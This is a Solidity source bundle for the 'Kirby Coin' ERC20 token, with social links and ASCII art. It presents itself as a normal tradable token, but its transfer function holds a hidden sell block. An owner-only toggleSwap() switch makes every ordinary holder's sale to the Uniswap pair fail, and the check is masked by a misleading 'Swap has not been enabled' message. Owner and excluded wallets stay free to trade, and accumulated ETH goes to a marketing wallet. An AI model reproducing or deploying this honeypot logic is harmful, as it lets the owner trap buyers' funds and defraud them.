{{
  "language": "Solidity",
  "sources": {
    "contract.sol": {
      "content": "/*\r\n\r\nWeb - https://kirbycoin.co/\r\n\r\nTelegram - https://t.me/kirbyerc\r\n\r\nTwitter - https://twitter.com/KirbyCoinErc\r\n\r\n\r\n\r\n⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠛⠉⠉⠛⠶⣄⡤⠞⠻⠫⠙⠳⢤⡀⠀⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⢠⠟⠁⠀⠀⠀⠀⠀⠀⠈⠀⢰⡆⠀⠀⠐⡄⠻⡄⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠦⠤⣤⣇⢀⢷⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⢈⡼⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⠘⣆⢰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣼⠃⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠙⣎⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣝⠳⣄⡀⠀⠀⠀⠀⠀⢀⡴⠟⠁⠀⠀⠀⠀⠀\r\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢮⣉⣒⣖⣠⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀\r\n⠀⠀⠀⣀⣴⠶⠶⢦⣀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⢀⣠⣤⣤⣀⠀⠀⠀\r\n⠀⢀⡾⠋⠀⠀⠀⠀⠉⠧⠶⠒⠛⠛⠛⠛⠓⠲⢤⣴⡟⠅⠀⠀⠈⠙⣦⠀\r\n⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⠀⠀⣀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠸⣇\r\n⠀⣿⡀⠀⠀⠀⠀⠀⢀⡟⢁⣿⠀⢠⠎⢙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽\r\n⠀⠈⢻⡇⠀⠀⠀⠀⣾⣧⣾⡃⠀⣾⣦⣾⠇⠀⠀⠀⠀⠀⠀⠀⠰⠀⣼⠇\r\n⠀⢰⡟⠀⡤⠴⠦⣬⣿⣿⡏⠀⢰⣿⣿⡿⢀⡄⠤⣀⡀⠀⠀⠀⠰⢿⡁⠀\r\n⠀⡞⠀⢸⣇⣄⣤⡏⠙⠛⢁⣴⡈⠻⠿⠃⢚⡀⠀⣨⣿⠀⠀⠀⠀⢸⡇⠀\r\n⢰⡇⠀⠀⠈⠉⠁⠀⠀⠀⠀⠙⠁⠀⠀⠀⠈⠓⠲⠟⠋⠀⠀⠀⠀⢀⡇⠀\r\n⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀\r\n⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡄⠀\r\n⠀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠋⣷⠀\r\n⠀⠀⢰⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⣿⡇\r\n⠀⠀⢸⡯⠈⠛⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠾⠋⠂⠀⠀⣿⠃\r\n⠀⠀⠈⣷⣄⡛⢠⣈⠉⠛⠶⢶⣶⠶⠶⢶⡶⠾⠛⠉⠀⠀⠀⠁⢠⣠⡏⠀\r\n⠀⠀⠀⠈⠳⣅⡺⠟⠀⣀⡶⠟⠁⠀⠀⠘⢷⡄⠀⠛⠻⠦⡄⢀⣒⡿⠀⠀\r\n⠀⠀⠀⠀⠀⠈⠉⠉⠛⠁⠀⠀⠀⠀⠒⠂⠀⠙⠶⢬⣀⣀⣤⡶⠟⠁⠀⠀\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: NONE\r\npragma solidity ^0.8.12;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {return msg.sender;}\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        _beforeTokenTransfer(from, to, amount);\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n        emit Transfer(from, to, amount);\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ncontract KIRB is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    string private _name = \"Kirby Coin\";\r\n    string private _symbol = \"KIRBY\";\r\n    bool private swapping;\r\n    mapping(address => bool) private isExcludedFromFees;\r\n    mapping(address => bool) private isExcludedMaxTransactionAmount;\r\n    uint256 public swapTokensAtAmount;\r\n    uint256 public buyFee;\r\n    uint256 public sellFee;\r\n    address public uniswapV2Pair;\r\n    address private constant DEAD = address(0xdead);\r\n    address private constant ZERO = address(0);\r\n    uint256 public maxTransactionAmount;\r\n    uint256 public maxWallet;\r\n    bool public tradingStart = false;\r\n    bool public swapEnabled = false;\r\n    bool public limitsInEffect = true;\r\n    address public marketingWallet;\r\n    mapping(address => bool) private pairs;\r\n\r\n    constructor() ERC20(_name, _symbol) {\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Router = _uniswapV2Router;\r\n        excludeFromMaxTransactionAmount(address(_uniswapV2Router), true);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        pairs[address(uniswapV2Pair)] = true;\r\n        excludeFromMaxTransactionAmount(address(uniswapV2Pair), true);\r\n        uint256 totalSupply = 10000000 * 10**decimals();\r\n        maxTransactionAmount = totalSupply;\r\n        buyFee = 0;\r\n        sellFee = 0;\r\n        maxWallet = totalSupply;\r\n        swapTokensAtAmount = totalSupply.mul(1).div(100);\r\n        marketingWallet = address(0x7A34462e0302C2bF13a006Cf6c0BdD99c4593adA);\r\n        excludeFromMaxTransactionAmount(owner(), true);\r\n        excludeFromMaxTransactionAmount(address(this), true);\r\n        excludeFromMaxTransactionAmount(DEAD, true);\r\n        excludeFromMaxTransactionAmount(marketingWallet, true);\r\n        _mint(_msgSender(), totalSupply.mul(100).div(100));\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n\r\n\r\n    function excludeFromMaxTransactionAmount(address _address, bool excluded) public onlyOwner {\r\n        isExcludedMaxTransactionAmount[_address] = excluded;\r\n    }\r\n\r\nfunction toggleSwap() external onlyOwner {\r\n        swapEnabled = !swapEnabled;\r\n    }\r\n\r\nfunction _transfer(address from, address to, uint256 amount) internal override {\r\n    require(from != ZERO, \"ERC20: transfer from the zero address.\");\r\n    require(to != DEAD, \"ERC20: transfer to the zero address.\");\r\n    require(amount > 0, \"ERC20: transfer amount must be greater than zero.\");\r\n\r\n    if (from != owner() && to != owner() && to != ZERO && to != DEAD && !swapping) {\r\n        if (!tradingStart) {\r\n            require(isExcludedFromFees[from] || isExcludedFromFees[to], \"Trading is not active.\");\r\n        }\r\n\r\n        if (limitsInEffect) {\r\n            if (pairs[from] && !isExcludedMaxTransactionAmount[to]) {\r\n                require(amount <= maxTransactionAmount, \"Buy transfer amount exceeds the max transaction amount.\");\r\n                require(amount + balanceOf(to) <= maxWallet, \"Max wallet exceeded.\");\r\n            } else if (pairs[to] && !isExcludedMaxTransactionAmount[from]) {\r\n                require(amount <= maxTransactionAmount, \"Sell transfer amount exceeds the max transaction amount.\");\r\n                require(!swapEnabled, \"Swap has not been enabled.\");\r\n            } else if (!isExcludedMaxTransactionAmount[to]) {\r\n                require(amount + balanceOf(to) <= maxWallet, \"Max wallet exceeded.\");\r\n            }\r\n        }\r\n    }\r\n\r\n    bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;\r\n    if (\r\n        canSwap &&\r\n        swapEnabled &&\r\n        !swapping &&\r\n        !pairs[from] &&\r\n        !isExcludedFromFees[from] &&\r\n        !isExcludedFromFees[to]\r\n    ) {\r\n        swapping = true;\r\n        swapBack(false);\r\n        swapping = false;\r\n    }\r\n\r\n    bool takeFee = !swapping;\r\n\r\n    if (isExcludedFromFees[from] || isExcludedFromFees[to]) {\r\n        takeFee = false;\r\n    }\r\n\r\n    uint256 fees = 0;\r\n    if (takeFee) {\r\n        if(pairs[to] || pairs[from]) {\r\n            fees = amount.mul(buyFee).div(100);\r\n        }\r\n        if (pairs[to] && buyFee > 0) {\r\n            fees = amount.mul(buyFee).div(100);\r\n        } else if (pairs[from] && sellFee > 0) {\r\n            fees = amount.mul(sellFee).div(100);\r\n        }\r\n\r\n        if (fees > 0) {\r\n            super._transfer(from, address(this), fees);\r\n        }\r\n        amount -= fees;\r\n    }\r\n    super._transfer(from, to, amount);\r\n}\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function startTrade() external onlyOwner {\r\n        require(!tradingStart, \"Trading is already open\");\r\n        tradingStart = true;\r\n        }\r\n\r\n    function swapBack(bool _manualSwap) private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        bool success;\r\n\r\n        if (contractBalance == 0) {\r\n            return;\r\n        }\r\n\r\n        if (_manualSwap == false && contractBalance > swapTokensAtAmount * 20) {\r\n            contractBalance = swapTokensAtAmount * 20;\r\n        }\r\n\r\n        swapTokensForEth(contractBalance);\r\n        (success, ) = address(marketingWallet).call{value: address(this).balance}(\"\");\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}